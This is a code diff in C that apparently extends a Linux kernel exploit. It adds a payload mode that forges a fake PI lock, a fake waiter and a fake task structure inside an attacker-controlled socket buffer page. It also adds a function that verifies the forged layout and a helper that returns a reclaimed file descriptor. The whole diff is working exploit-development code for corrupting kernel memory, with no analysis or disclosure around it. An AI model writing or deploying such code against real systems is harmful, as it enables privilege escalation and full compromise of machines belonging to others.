@@ -1119,6 +1119,42 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
     unsigned char *p = skb_buf + chunk + SKB_FRAG_BIAS;
 
     put32(p, LOCK_OFF + 0x00, 0);
+    if (payload_mode == PAGE_PAYLOAD_S2) {
+      /* H1A-S2 proxy-root contract: W0 is the known terminal lock/PI
+       * root and FT is a passive owner.  The sendmsg-shaped stale waiter
+       * is deliberately a childless red root ({NULL,0} iovs). */
+      put64(p, LOCK_OFF + 0x08, fake_w0);
+      put64(p, LOCK_OFF + 0x10, fake_w0);
+      put64(p, LOCK_OFF + 0x18, fake_task | 1);
+
+      put64(p, W0_OFF + 0x00, 1);
+      put64(p, W0_OFF + 0x08, 0);
+      put64(p, W0_OFF + 0x10, 0);
+      put64(p, W0_OFF + 0x18, 1);
+      put64(p, W0_OFF + 0x20, 0);
+      put64(p, W0_OFF + 0x28, 0);
+      put64(p, W0_OFF + 0x30, fake_task);
+      put64(p, W0_OFF + 0x38, fake_lock);
+      put32(p, W0_OFF + 0x40, 140);
+      put32(p, W0_OFF + 0x44, 0);
+      put64(p, W0_OFF + 0x48, 0);
+      put64(p, W0_OFF + 0x50, 0);
+      put64(p, W0_OFF + 0x58, 0);
+
+      put32(p, FAKE_TASK_OFF + FAKE_TASK_USAGE_OFF, 0x100);
+      put32(p, FAKE_TASK_OFF + FAKE_TASK_PRIO_OFF, FAKE_TASK_PRIO);
+      put32(p, FAKE_TASK_OFF + FAKE_TASK_NORMAL_PRIO_OFF, FAKE_TASK_PRIO);
+      put64(p, FAKE_TASK_OFF + 0x420, 0);
+      put32(p, FAKE_TASK_OFF + FAKE_TASK_PI_LOCK_OFF, 0);
+      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF,
+            fake_w0 + 0x18);
+      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08,
+            fake_w0 + 0x18);
+      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_TOP_TASK_OFF, fake_task);
+      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_BLOCKED_ON_OFF, 0);
+      continue;
+    }
+
     if (payload_mode == PAGE_PAYLOAD_SLIDE) {
       /* Two-level PI chain within our controlled page:
        * stale_waiter -> fake_lock (trylock OK) -> owner = fake_task
@@ -1538,6 +1574,75 @@ void ks_relocate_fd_min(int *fd, int min_fd) {
     close(*fd);
     *fd = high;
   }
+}
+
+int s2_payload_contract_ok(void) {
+  if (!skb_buf || !page_base || !fake_lock || !fake_w0 || !fake_task) {
+    pr_error("S2 contract missing controlled-page state\n");
+    return 0;
+  }
+
+  for (size_t chunk = 0; chunk < SKB_SEND_SIZE; chunk += ORDER3_SIZE) {
+    const unsigned char *p = skb_buf + chunk;
+    uint64_t got64;
+    uint32_t got32;
+
+    memcpy(&got32, p + LOCK_OFF, sizeof(got32));
+    memcpy(&got64, p + LOCK_OFF + 0x08, sizeof(got64));
+    if (got32 != 0 || got64 != fake_w0) return 0;
+    memcpy(&got64, p + LOCK_OFF + 0x10, sizeof(got64));
+    if (got64 != fake_w0) return 0;
+    memcpy(&got64, p + LOCK_OFF + 0x18, sizeof(got64));
+    if (got64 != (fake_task | 1)) return 0;
+
+    static const size_t w0_offsets[] = {
+      0x00, 0x08, 0x10, 0x18, 0x20, 0x28, 0x30, 0x38, 0x40, 0x44, 0x48,
+      0x50, 0x58
+    };
+    const uint64_t w0_expect[] = {
+      1, 0, 0, 1, 0, 0, fake_task, fake_lock, 140, 0, 0, 0, 0
+    };
+    for (size_t i = 0; i < sizeof(w0_offsets) / sizeof(w0_offsets[0]); ++i) {
+      memcpy(&got64, p + W0_OFF + w0_offsets[i], sizeof(got64));
+      if (got64 != w0_expect[i]) return 0;
+    }
+
+    memcpy(&got32, p + FAKE_TASK_OFF + FAKE_TASK_USAGE_OFF, sizeof(got32));
+    if (got32 != 0x100) return 0;
+    memcpy(&got32, p + FAKE_TASK_OFF + FAKE_TASK_PRIO_OFF, sizeof(got32));
+    if (got32 != FAKE_TASK_PRIO) return 0;
+    memcpy(&got32, p + FAKE_TASK_OFF + FAKE_TASK_NORMAL_PRIO_OFF,
+           sizeof(got32));
+    if (got32 != FAKE_TASK_PRIO) return 0;
+    memcpy(&got64, p + FAKE_TASK_OFF + 0x420, sizeof(got64));
+    if (got64 != 0) return 0;
+    memcpy(&got32, p + FAKE_TASK_OFF + FAKE_TASK_PI_LOCK_OFF,
+           sizeof(got32));
+    if (got32 != 0) return 0;
+    memcpy(&got64, p + FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF,
+           sizeof(got64));
+    if (got64 != fake_w0 + 0x18) return 0;
+    memcpy(&got64, p + FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 8,
+           sizeof(got64));
+    if (got64 != fake_w0 + 0x18) return 0;
+    memcpy(&got64, p + FAKE_TASK_OFF + FAKE_TASK_PI_TOP_TASK_OFF,
+           sizeof(got64));
+    if (got64 != fake_task) return 0;
+    memcpy(&got64, p + FAKE_TASK_OFF + FAKE_TASK_PI_BLOCKED_ON_OFF,
+           sizeof(got64));
+    if (got64 != 0) return 0;
+
+    for (size_t off = FOPS_TABLE_OFF; off + 8 <= FOPS_TABLE_OFF + 0xe8;
+         off += 8) {
+      memcpy(&got64, p + off, sizeof(got64));
+      if (got64 != 0) return 0;
+    }
+  }
+  return 1;
+}
+
+int s2_reclaim_fd(void) {
+  return reclaim_sv[1];
 }
 
 void exlog_protect_fd(void) {
